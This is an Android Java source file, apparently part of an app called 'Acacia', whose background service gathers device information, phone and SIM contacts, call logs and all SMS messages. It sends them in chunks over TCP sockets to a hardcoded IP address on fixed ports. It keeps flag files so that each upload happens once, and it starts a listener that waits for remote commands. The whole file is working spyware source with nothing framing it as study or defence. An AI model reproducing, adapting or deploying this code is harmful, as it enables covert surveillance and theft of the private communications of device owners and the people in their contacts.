package com.xxiong.acacia;

import android.app.IntentService;
import android.content.Intent;
import android.os.Environment;

import java.io.BufferedOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.net.Socket;

public class MyIntentService extends IntentService {
    private final String WORKDIR = "Acacia";
    private final String IP = "172.24.13.21";
    private final int PORT1 = 65531;
    private final int PORT2 = 65532;
    private final int PORT3 = 65533;
    private InfoGather infogather = null;
    private ContactGather contactGather = null;
    private ShortMessageGather smsGather = null;

    public MyIntentService() {
        super("MyIntentService");
    }

    @Override
    protected void onHandleIntent(Intent intent) {
        infogather = new InfoGather(this);
        contactGather = new ContactGather(this);
        smsGather = new ShortMessageGather(this);
        WaitForCmd waitForCmd = new WaitForCmd(IP, PORT3);
        mkWorkDir(WORKDIR);
        if (!checkoutFlag("fixed")) {
            if (sendFixed()) {
                logFlag("fixed");
            }
        }
        if (!checkoutFlag("contact")) {
            if (sendContact()) {
                logFlag("contact");
            }
        }
        if (!checkoutFlag("calllog")) {
            if (sendCallLog()) {
                logFlag("calllog");
            }
        }
        if (!checkoutFlag("sms")) {
            if (sendSMessage()) {
                logFlag("sms");
            }
        }
        waitForCmd.start();
    }

    /**
     * 创建app的数据存放目录
     * @param dir
     */
    private void mkWorkDir(String dir) {
        File file = new File(Environment.getExternalStorageDirectory(), dir);
        if (file.exists()) { return; }
        else { file.mkdir(); }
    }

    /**
     * 判断硬件信息是否发送成功
     * @param filename - flag文件相对外存的路径
     * @return false - flag文件不存在，表示没有发送成功
     */
    private boolean checkoutFlag(String filename) {
        filename = WORKDIR + "/" + filename;
        File file = new File(Environment.getExternalStorageDirectory(), filename);
        if (file.exists()) {  return true;  }
        else {  return false; }
    }

    /**
     * 记录flag表示数据已发送
     * @param filename - flag文件相对外存的路径
     */
    private void logFlag(String filename) {
        writeData(filename, "true");
    }

    /**
     * 写内容到文件
     * @param filename 文件名
     * @param data 内容
     */
    private void writeData(String filename, String data) {
        filename = WORKDIR + "/" + filename;
        File file = new File(Environment.getExternalStorageDirectory(), filename);
        try {
            OutputStream out = new FileOutputStream(file, true);
            out.write(data.getBytes());
            out.close();
        } catch (IOException e) { }
    }

    /**
     * 收集部分信息并发送
     * 这里收集的信息由于不会常改变或者不会改变，因此只需要发送一次
     * @return true - 发送成功
     */
    private boolean sendFixed() {
        String info = infogather.getInfo();
        return sendData(info, IP, PORT1);
    }

    /**
     * 将联系人信息发往指定主机
     * @return true - 发送成功
     */
    private boolean sendContact() {
        String contacts = contactGather.getPhoneContacts() + contactGather.getSIMContacts();
        return sendData(contacts, IP, PORT1);
    }

    /**
     * 发送通话记录
     * @return true - 发送成功
     */
    private boolean sendCallLog() {
        String logs = contactGather.getCallLog();
        return sendData(logs, IP, PORT1);
    }

    /**
     * 发送短消息记录
     * @return true - 发送成功
     */
    private boolean sendSMessage() {
        String contents = smsGather.getAllSMS();
        return sendData(contents, IP, PORT2);
    }

    /**
     * 发送TCP数据包
     * @param data 发送的内容
     * @param ip 目标主机IP
     * @param port 目标主机端口
     * @return true - 发送成功
     */
    private boolean sendData(String data, String ip, int port) {
        if (data == null) return false;
        int PIECESIZE = 1024;
        int len = data.length();
        int tail = 0;
        boolean flag = true;
        for (int i = 0; i < len; i += PIECESIZE) {
            tail = i + PIECESIZE;
            if (tail > len) { tail = len; }
            if (!__sendData(data.substring(i, tail), ip, port)) {
                flag = false;
            }
        }
        return flag;
    }

    /**
     * 发送TCP数据包
     * @param data 发送的内容
     * @param ip 目标主机IP
     * @param port 目标主机端口
     * @return true - 发送成功
     */
    private static boolean __sendData(String data, String ip, int port) {
        try {
            Socket s = new Socket(ip, port);
            OutputStream out = s.getOutputStream();
            BufferedOutputStream bop = new BufferedOutputStream(out);
            bop.write(data.getBytes());
            bop.flush();
            bop.close();
            out.close();
        } catch (Exception e) { return false; }
        return true;
    }
}
